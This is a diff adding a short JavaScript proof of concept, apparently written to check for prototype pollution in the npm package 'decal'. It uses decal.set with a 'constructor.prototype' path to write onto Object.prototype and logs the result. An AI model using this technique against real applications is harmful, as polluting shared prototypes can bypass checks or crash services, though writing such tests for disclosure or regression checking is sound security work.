@@ -1,0 +1,12 @@
+var obj = {};
+obj.constructor.prototype.polluted = undefined;
+Object.defineProperty(obj, 'constructor', {
+    value: obj.constructor,
+    writable: true,
+    enumerable: true,
+    configurable: true
+});
+const decal = require('decal');
+console.log({}.polluted);
+decal.set(obj, 'constructor.prototype.polluted', 'yes');
+console.log({}.polluted);
